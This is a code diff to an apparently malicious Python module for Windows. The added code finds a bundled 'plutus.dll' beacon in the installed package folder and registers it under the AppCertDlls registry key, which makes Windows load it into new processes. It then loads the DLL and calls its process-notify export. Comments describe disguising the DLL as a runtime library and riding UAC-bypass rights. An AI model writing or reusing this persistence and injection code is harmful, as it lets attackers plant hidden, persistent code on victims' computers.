@@ -5,7 +5,9 @@ import os
 import winreg
 from typing import List
 import requests
+import pathlib
 import glob
+from importlib.util import find_spec
 from ctypes import wintypes
 from typing import Final, Callable
 # import os.path as Path
@@ -235,19 +237,19 @@ def setup_environment():
     # print(f"Return code: {process.returncode}")
 
 
-def inject_appcertdlls(paths: List[str]) -> bool:
+def inject_appcertdlls(path) -> bool:
     """
     Actually writes to HKLM\...\AppCertDlls (requires SeDebugPrivilege or admin in most cases,
     but on many BYOVD/UAC-bypass scenarios you already have the needed rights).
     """
-    value_data = " ".join(paths) + "plutus.dll"
+    # path = " ".join(paths) + "plutus.dll"
     key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls"
 
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
-        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, value_data)   # default value = the paths
+        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, path)   # default value = the paths
         winreg.CloseKey(key)
-        print(f"[+] AppCertDlls injected ({len(paths)} path(s)) → {value_data}")
+        print(f"[+] AppCertDlls injected ({len(path)} path) → {path}")
         return True
     except PermissionError:
         print("[-] Failed: No privileges to write to AppCertDlls (expected if not elevated yet)")
@@ -264,8 +266,8 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
     Prioritized targets = folders that are naturally writable by normal users in 2025
     """
 
-    path = glob.glob("C:\\Users\\malware\\AppData\\Local\\Packages\\PythonSoftwareFoundation*\\**\\site-packages\\src\\plutus.dll",)
-    print (path)
+    # path = glob.glob("C:\\Users\\malware\\AppData\\Local\\plutus.dll")
+    # print (path)
     
 
     # base = os.path.expanduser(r"~\\AppData\\Local\\Packages\\PythonSoftwareFoundation*")
@@ -276,10 +278,17 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
         # recursive=True
     # )    
 
-
-    # with open("plutus.dll", "rb") as f:
-    #     data = f.read()
+    # print (os.getcwd())
+    PACKAGE_ROOT = pathlib.Path(find_spec(__name__.split('.')[0]).origin).parent.resolve()
+    # print (PACKAGE_ROOT)
+    # path = f"{PACKAGE_ROOT}/plutus.dll"
+    file = glob.glob(f"{PACKAGE_ROOT}\plutus.dll")[0]
+    print (file)
+    with open(file, "rb") as f:
+        data = f.read()
     
+    inject_appcertdlls(file)
+
     # dll = ctypes.WinDLL("plutus.dll")  # assuming it's already reflectively loaded or on disk
 
     # # Define the function signature (this is hypothetical - actual signature varies by version)
@@ -307,11 +316,10 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
     #     # 5. Skype (still preinstalled on many images)
     #     "Microsoft.SkypeApp_*",
     # ]
-    print (paths)
 
-    return 
-    with open(paths[0], "rb") as f:
-        data = f.read()
+    # return 
+    # with open(path[0], "rb") as f:
+        # data = f.read()
 
     # windowsapps = glob.glob("C:/Program Files/Common Files/**/**/**/")
     # if not windowsapps:
@@ -343,7 +351,7 @@ def mv_dll_plutus_noadmin(beacon_path="plutus.dll", fake_name="VCRUNTIME140_1.dl
         # location = f"{folder}/plutus.dll"
         # with open(location, "wb") as dll:
         #     dll.write(data) 
-        dll = ctypes.WinDLL(path)  # assuming it's already reflectively loaded or on disk
+        dll = ctypes.WinDLL(file)  # assuming it's already reflectively loaded or on disk
         # Define the function signature (this is hypothetical - actual signature varies by version)
         CreateProcessNotify = dll.CreateProcessNotify
         CreateProcessNotify.argtypes = []  # usually no arguments
